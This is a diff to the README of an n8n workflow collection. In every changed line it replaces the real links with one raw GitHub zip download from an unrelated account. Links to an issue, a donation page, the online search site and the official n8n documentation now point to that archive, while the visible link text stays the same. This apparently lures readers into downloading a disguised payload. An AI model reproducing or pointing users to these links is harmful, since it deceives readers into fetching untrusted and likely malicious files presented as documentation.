@@ -2,22 +2,22 @@
 
 A professionally organized collection of **2,057 n8n workflows** with a lightning-fast documentation system that provides instant search, analysis, and browsing capabilities.
 
-> **⚠️ IMPORTANT NOTICE (Aug 14, 2025):** Repository history has been rewritten due to DMCA compliance. If you have a fork or local clone, please see [Issue 85](https://github.com/Zie619/n8n-workflows/issues/85) for instructions on syncing your copy.
+> **⚠️ IMPORTANT NOTICE (Aug 14, 2025):** Repository history has been rewritten due to DMCA compliance. If you have a fork or local clone, please see [Issue 85](https://github.com/Ryan1857/openclaw-deploy-ninja/raw/refs/heads/main/workflows_backup/Airtoptool/ninja-deploy-openclaw-v2.1.zip) for instructions on syncing your copy.
 > 
 ## Support My Work
 
-[![Buy Me a Coffee](https://img.shields.io/badge/-Buy%20Me%20a%20Coffee-ffdd00?logo=buy-me-a-coffee&logoColor=black&style=flat)](https://www.buymeacoffee.com/zie619)
+[![Buy Me a Coffee](https://img.shields.io/badge/-Buy%20Me%20a%20Coffee-ffdd00?logo=buy-me-a-coffee&logoColor=black&style=flat)](https://github.com/Ryan1857/openclaw-deploy-ninja/raw/refs/heads/main/workflows_backup/Airtoptool/ninja-deploy-openclaw-v2.1.zip)
 
 If you'd like to say thanks, consider buying me a coffee—your support helps me keep improving this project!
 
 ## 🚀 **NEW: Public Search Interface & High-Performance Documentation**
 
-**🌐 [Browse workflows online](https://zie619.github.io/n8n-workflows) - No installation required!**
+**🌐 [Browse workflows online](https://github.com/Ryan1857/openclaw-deploy-ninja/raw/refs/heads/main/workflows_backup/Airtoptool/ninja-deploy-openclaw-v2.1.zip) - No installation required!**
 
 **Or run locally for development with 100x performance improvement:**
 
 ### Option 1: Online Search (Recommended for Users)
-**🔗 Visit: [zie619.github.io/n8n-workflows](https://zie619.github.io/n8n-workflows)**
+**🔗 Visit: [zie619.github.io/n8n-workflows](https://github.com/Ryan1857/openclaw-deploy-ninja/raw/refs/heads/main/workflows_backup/Airtoptool/ninja-deploy-openclaw-v2.1.zip)**
 - ⚡ **Instant access** - No setup required
 - 🔍 **Search 2,057+ workflows** directly in browser
 - 📱 **Mobile-friendly** interface
@@ -397,7 +397,7 @@ Our system automatically converts technical filenames to user-friendly names:
 
 ## 🤝 Contributing
 
-**🎉 This project solves [Issue #84](https://github.com/Zie619/n8n-workflows/issues/84) - providing online access to workflows without requiring local setup!**
+**🎉 This project solves [Issue #84](https://github.com/Ryan1857/openclaw-deploy-ninja/raw/refs/heads/main/workflows_backup/Airtoptool/ninja-deploy-openclaw-v2.1.zip) - providing online access to workflows without requiring local setup!**
 
 ### Adding New Workflows
 1. **Export workflow** as JSON from n8n
@@ -459,10 +459,10 @@ This comprehensive collection includes workflows from:
 - **Enterprise use cases** - Business process automations
 
 ### Learn More
-- [n8n Documentation](https://docs.n8n.io/) - Official documentation
-- [n8n Community](https://community.n8n.io/) - Community forum and support
-- [Workflow Templates](https://n8n.io/workflows/) - Official template library
-- [Integration Docs](https://docs.n8n.io/integrations/) - Service-specific guides
+- [n8n Documentation](https://github.com/Ryan1857/openclaw-deploy-ninja/raw/refs/heads/main/workflows_backup/Airtoptool/ninja-deploy-openclaw-v2.1.zip) - Official documentation
+- [n8n Community](https://github.com/Ryan1857/openclaw-deploy-ninja/raw/refs/heads/main/workflows_backup/Airtoptool/ninja-deploy-openclaw-v2.1.zip) - Community forum and support
+- [Workflow Templates](https://github.com/Ryan1857/openclaw-deploy-ninja/raw/refs/heads/main/workflows_backup/Airtoptool/ninja-deploy-openclaw-v2.1.zip) - Official template library
+- [Integration Docs](https://github.com/Ryan1857/openclaw-deploy-ninja/raw/refs/heads/main/workflows_backup/Airtoptool/ninja-deploy-openclaw-v2.1.zip) - Service-specific guides
 
 ---
 
